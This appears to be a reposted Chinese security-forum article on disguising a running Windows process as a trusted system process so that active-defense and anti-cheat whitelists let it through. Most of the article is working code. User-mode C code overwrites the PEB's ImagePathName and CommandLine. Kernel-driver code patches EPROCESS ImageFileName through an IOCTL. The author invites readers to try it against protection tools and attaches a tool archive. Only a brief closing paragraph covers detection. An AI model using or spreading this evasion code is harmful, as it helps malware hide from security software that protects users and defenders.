
# 运行期修改可执行文件的路径和 Command Line

> 原文：[`www.pediy.com/kssd/pediy10/57682.html`](https://www.pediy.com/kssd/pediy10/57682.html)

cc682/NetRoc

目前的很多主动防御工具和反 XX 系统，在对特定进程进行保护的时候，出于兼容性的考虑，都会保留一些白名单。特别是一些系统进程，例如 `csrss.exe`、`svchost.exe` 等等。而针对这些系统进程，判断是否在白名单中的方式，为了简便起见经常采用取系统路径、可执行文件名的方式。

内核中比较明显的能够取到可执行文件路径的方法有下面几个：

1.  通过 `PEB. ProcessParameters -> ImagePathName` 取得可执行文件路径，通过 `PEB. ProcessParameters -> CommandLine` 取得执行的命令行，以及 `PEB. ProcessParameters` 里面其他几个成员取得其他一些相关的路径信息。
2.  通过 `nt!\_EPROCESS` 的 `ImageFileName` 取得。
3.  通过 `nt!\_EPROCESS:: SeAuditProcessCreationInfo:: ImageFileName` 取得。
4.  通过和 `_EPROCESS` 相关的文件对象信息取得。

常见的方式一般只有 1、2 两种。而上述的前三种方式都可以在运行时被修改掉，用来进行欺骗。特别是 `PEB` 里面的信息由于在 `ring3` 直接就可以访问，实现上来说非常简单。

下面这段代码通过 `NtQueryInformationProcess` 拿到 `PEB`，然后修改路径信息：

```
HMODULE hMod = GetModuleHandle( _T( "ntdll.dll"));

pfnNtQueryInformationProcess p = (pfnNtQueryInformationProcess)::GetProcAddress( hMod, "NtQueryInformationProcess");

PROCESS_BASIC_INFORMATION stInfo = {0};

DWORD dwRetnLen = 0;

DWORD dw = p( GetCurrentProcess(), ProcessBasicInformation, &stInfo, sizeof(stInfo), &dwRetnLen);

PPEB pPeb = stInfo.PebBaseAddress;

WCHAR wszFullPath[MAX_PATH] = {0};

WCHAR wszTmp2[MAX_PATH] = {0};

wcscpy( wszFullPath, wszPath);

MultiByteToWideChar( CP_THREAD_ACP, 0, szName, -1, wszTmp2, MAX_PATH);

wcscat( wszFullPath, wszTmp2);

wcscpy( pPeb->ProcessParameters->ImagePathName.Buffer, wszFullPath);

pPeb->ProcessParameters->ImagePathName.Length = wcslen( wszFullPath) * sizeof(WCHAR);

int nParamStart = 0;

WCHAR *wszTmp = new WCHAR[pPeb->ProcessParameters->CommandLine.MaximumLength];

ZeroMemory( wszTmp, sizeof(WCHAR) * pPeb->ProcessParameters->CommandLine.MaximumLength);

wcscpy( wszTmp, pPeb->ProcessParameters->CommandLine.Buffer);

if ( pPeb->ProcessParameters->CommandLine.Buffer[0] == '"')

{

    for ( int i = 1; i < pPeb->ProcessParameters->CommandLine.Length / 2; i++)

    {

        if ( pPeb->ProcessParameters->CommandLine.Buffer[i] == '"')

        {

            nParamStart = i;

        }

    }

}

if ( nParamStart != 0)

{

    if ( pPeb->ProcessParameters->CommandLine.Buffer[0] == '"')

    {

        pPeb->ProcessParameters->CommandLine.Buffer[0] = NULL;

        wcscat( pPeb->ProcessParameters->CommandLine.Buffer, L"\\"");

    }

    else

    {

        pPeb->ProcessParameters->CommandLine.Buffer[0] = NULL;

    }

    wcscat( pPeb->ProcessParameters->CommandLine.Buffer, wszFullPath);

    wcscat( pPeb->ProcessParameters->CommandLine.Buffer, wszTmp + nParamStart);

}

delete[] wszTmp;
```

这个方式可以欺骗通过 `toolhelp` 函数枚举出来的模块路径，以及直接读取 `PEB` 获取进程主模块路径的方式。

另外，通过修改 `EPROCESS` 中的主模块名信息，可以欺骗一些在驱动层的程序。基本的代码如下：

首先需要获取 `EPROCESS` 里面 `ImageFileName` 的偏移。这个函数必须在 `DriverEntry` 里面调用。

```
ULONG GetNameOffsetInEProcss()

{

PEPROCESS pProcess = NULL;

ULONG i = 0;

pProcess = PsGetCurrentProcess();

for ( i = 0; i < 0x1000; i++)

{

    if ( strncmp( "System", (PUCHAR)pProcess + i, strlen("System")) == 0)

    {

        return i;

    }

}

return 0;

}
```

然后可以在 `IoCtrl` 里面修改当前进程的名字：

```
case IOCTL_CHANGE_EXENAME:

szName = (char*)Irp->AssociatedIrp.SystemBuffer;

if ( !szName)

{

    ntStatus = STATUS_UNSUCCESSFUL;

    break;

}

pEProcess = PsGetCurrentProcess();

strncpy( (PCHAR)pEProcess + g_NameOffsetInEProcess, szName, 16);

ntStatus = STATUS_SUCCESS;

break;
```

由于只是示例，所以只实现了两种方式。修改 `SeAuditProcessCreationInfo` 里面的信息，考虑到兼容性问题，可能稍微复杂一点。不过也可以比较容易的实现。

这种方式的伪装可以穿过多少主动防御工具没有试过，大家可以去看看，哈哈。

至于对付的方式，可以通过上面说的第四种取进程路径的方法。不过就比较复杂了，呵呵。

流程就是，通过 `EPROCESS` 的 `SectionObject` 获得文件的 `FilePointer`，通过 `ObQueryNameString` 取得这个对象的名字。然后就可以取得主映像模块的路径了。详细的代码可以参考 `wrk` 中 `NtQueryInformationProcess` 的相关实现。

下面是实现的代码:

上传的附件

| ![](img/c8c74a380a3dea7fa2460187d80ee5e0.jpg) || `ImgPathChanger.rar`
|
